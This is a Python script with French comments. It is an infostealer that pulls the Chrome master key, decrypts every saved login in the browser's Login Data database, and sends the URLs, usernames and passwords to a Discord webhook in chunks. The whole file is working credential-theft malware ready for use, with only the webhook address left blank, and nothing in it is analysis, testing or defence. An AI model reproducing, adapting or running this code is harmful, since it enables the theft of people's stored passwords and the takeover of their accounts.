import os, json, base64, sqlite3, shutil, requests, time
from Crypto.Cipher import AES
import win32crypt


WEBHOOK_URL = "ENTER YOUR WEBHOOK"

def get_master_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], 
            r"AppData\Local\Google\Chrome\User Data\Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except: return "Erreur de décryptage"

def grab_chrome():
    master_key = get_master_key()
    if not master_key: return "Impossible de choper la Master Key."

    login_db = os.path.join(os.environ['USERPROFILE'], 
        r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
    
    # On utilise le dossier TEMP pour ne pas avoir d'erreur de permission
    temp_db = os.path.join(os.environ['TEMP'], "vault_temp.db")
    
    if os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass

    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    infos = "🔓 **COMPTES RÉCUPÉRÉS** 🔓\n\n"
    for url, user, pwd in cursor.fetchall():
        if user and pwd:
            decrypted_pwd = decrypt_password(pwd, master_key)
            infos += f"🌐 `{url}`\n👤 `{user}`\n🔑 `{decrypted_pwd}`\n\n"
    
    conn.close()
    time.sleep(1)
    os.remove(temp_db)
    return infos

if __name__ == "__main__":
    print("🚀 Lancement de l'extraction...")
    try:
        resultat = grab_chrome()
        # Envoi par blocs (Discord limite à 2000 caractères par message)
        if len(resultat) > 2000:
            for i in range(0, len(resultat), 2000):
                requests.post(WEBHOOK_URL, json={"content": resultat[i:i+2000]})
        else:
            requests.post(WEBHOOK_URL, json={"content": resultat})
        print("✅ Terminé ! Check ton Discord.")
    except Exception as e:
        requests.post(WEBHOOK_URL, json={"content": f"❌ Erreur fatale : {e}"})